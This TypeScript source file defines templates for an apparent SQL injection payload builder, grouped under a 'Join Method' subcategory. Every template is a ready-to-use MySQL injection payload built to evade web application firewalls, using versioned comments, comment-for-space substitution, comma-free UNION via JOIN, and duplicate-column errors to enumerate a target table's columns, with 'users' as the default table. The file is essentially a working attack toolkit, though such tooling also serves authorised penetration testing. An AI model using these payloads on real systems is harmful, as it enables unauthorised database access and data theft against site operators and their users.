import { BuilderSubcategory, TemplateConfig } from '../../types';

export const joinTemplates: TemplateConfig[] = [
  {
    id: 'waf-join-no-comma-union',
    name: 'No-Comma UNION (JOIN Columns) WAF',
    description: 'WAF bypass multi-column selection without comma syntax using version comments',
    content: '/*!50000UNION*//*!50000SELECT*/*/**/FROM/**/(SELECT/**/1)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(SELECT/**/3)c'
  },
  {
    id: 'waf-join-duplicate-column-init',
    name: 'Duplicate Column Discovery WAF',
    description: 'WAF bypass column discovery via duplicate column error with inline comments',
    content: '(/*!50000SELECT*/*/**/FROM/**/(/*!50000SELECT*/*/**/FROM/**/{table_name}/**/a/**/JOIN/**/{table_name}/**/b)c)',
    parameters: [
      {
        id: 'table_name',
        label: 'Table name',
        defaultValue: 'users',
        inputType: 'text'
      }
    ]
  },
  {
    id: 'waf-join-duplicate-column-using',
    name: 'Duplicate Column with USING() WAF',
    description: 'WAF bypass column discovery with USING() clause and comments',
    content: '(/*!50000SELECT*/*/**/FROM/**/(/*!50000SELECT*/*/**/FROM/**/{table_name}/**/a/**/JOIN/**/{table_name}/**/b/**/USING({column_name}))c)',
    parameters: [
      {
        id: 'table_name',
        label: 'Table name',
        defaultValue: 'users',
        inputType: 'text'
      },
      {
        id: 'column_name',
        label: 'Known columns (comma separated)',
        defaultValue: 'id',
        inputType: 'text'
      }
    ]
  },
  {
    id: 'waf-join-natural-clause',
    name: 'NATURAL JOIN Expression WAF',
    description: 'WAF bypass natural join with versioned comments',
    content: '(/*!50000SELECT*/*/**/FROM/**/{table_name}/**/a/**/NATURAL/**/JOIN/**/{table_name}/**/b)',
    parameters: [
      {
        id: 'table_name',
        label: 'Table name',
        defaultValue: 'users',
        inputType: 'text'
      }
    ]
  },
  {
    id: 'waf-join-cross-select',
    name: 'CROSS JOIN Columns WAF',
    description: 'WAF bypass cross join with versioned comments',
    content: '(/*!50000SELECT*/*/**/FROM/**/(SELECT/**/1)x/**/CROSS/**/JOIN/**/(SELECT/**/2)y)'
  }
];

export const joinSubcategory: BuilderSubcategory = {
  id: 'join',
  label: 'Join Method',
  description: 'WAF bypass join method templates (No-comma UNION, Duplicate column discovery USING, Natural/Cross JOIN)',
  templates: joinTemplates
};
